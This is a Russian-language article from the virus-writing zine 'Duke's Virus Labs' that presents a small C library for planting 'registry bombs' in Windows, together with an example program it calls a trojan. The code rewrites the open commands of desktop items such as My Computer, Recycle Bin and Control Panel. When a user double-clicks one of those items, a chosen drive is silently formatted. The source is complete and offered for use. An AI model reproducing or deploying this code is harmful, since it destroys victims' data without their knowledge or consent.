- [Duke's Virus Labs #3] - [Page 22] -

Бомбы в реестре Windows
(c) by SMT/SMF


   Продолжение глупеньких шуточек ...

   Вашему вниманию предлагается библиотека для создания бомб в реестре
Windows. Она подключается к любому Win32 C/C++ - приложению директивой

#include "r_bomb.c"

(h-файлы создавать не имеет смысла, поскольку эта програмка очень маленькая)
и содержит одну лишь функцию - void Fuckit(int,char) с двумя параметрами:

 int Item   - что будем Fuck'ать. Возможные варианты:
                      MY_COMPUTER,
                      RECYCLE_BIN,
                      INBOX,
                      INTERNET_MAIL,
                      INTERNET_NEWS,
                      THE_INTERNET,
                      MS_NETWORK,
                      CONTROL_PANEL
 char drive - какой диск форматировать при Double-click'e на выбранном Item'e

   Пример использования содержится в файле example.c .

   Отформатировать диск, на котором запущена windows и размещен swap,
не удастся (проверено), так что с диском C: ничего не выйдет :((

P.S. После компиляции не забывайте удалять отладочную информацию - это
     может на порядок (!) сократить размер полученного exe-файла
P.P.S. Пример написан для MS Visual C++ или для Watcom C/C++ 11.0

Текст библиотеки (файл r_bomb.c):
===== Cut here =====
#include <windows.h>

enum items { MY_COMPUTER, RECYCLE_BIN, INBOX, INTERNET_MAIL, INTERNET_NEWS,
                THE_INTERNET, MS_NETWORK, CONTROL_PANEL };

void Fuckit(int Item, char drive) {
  DWORD X, Y;
  HKEY newkey;
  BYTE *Cmd = "start /minimized command /c echo y|format x: /u >nul";
  BYTE *Path[] = {
    "software\\classes\\CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\Shell\\Open\\Command",
    "software\\classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\Shell\\Open\\Command",
    "software\\classes\\CLSID\\{00020D76-0000-0000-C000-000000000046}\\Shell\\Open\\Command",
    "software\\classes\\CLSID\\{89292102-4755-11cf-9DC2-00AA006C2B84}\\Shell\\Open\\Command",
    "software\\classes\\CLSID\\{89292103-4755-11cf-9DC2-00AA006C2B84}\\Shell\\Open\\Command",
    "software\\classes\\CLSID\\{FBF23B42-E3F0-101B-8488-00AA003E56F8}\\Shell\\Open\\Command",
    "software\\classes\\CLSID\\{00028B00-0000-0000-C000-000000000046}\\Shell\\Open\\Command",
    "software\\classes\\CLSID\\{21EC2020-3AEA-1069-A2DD-08002B30309D}\\Shell\\Open\\Command"
  };

  X=0;
  while (Cmd[X] != 'x') X++;
  Cmd[X] = drive;

  RegCreateKeyEx(HKEY_LOCAL_MACHINE,
        Path[Item],
        0,
        "",
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &newkey,
        &Y
  );

  RegSetValueEx(newkey,
        "", // (Default) //
        0,
        REG_SZ,
        Cmd,
        strlen(Cmd)+1
  );
  Cmd[X] = 'x';
}
===== Cut here =====

Пример троянца (файл example.c):
===== Cut here =====
#include "R_BOMB.c"

void main() {
  Fuckit(RECYCLE_BIN,   'a');
  Fuckit(CONTROL_PANEL, 'b');
  Fuckit(MY_COMPUTER,   'd');
}
===== Cut here =====
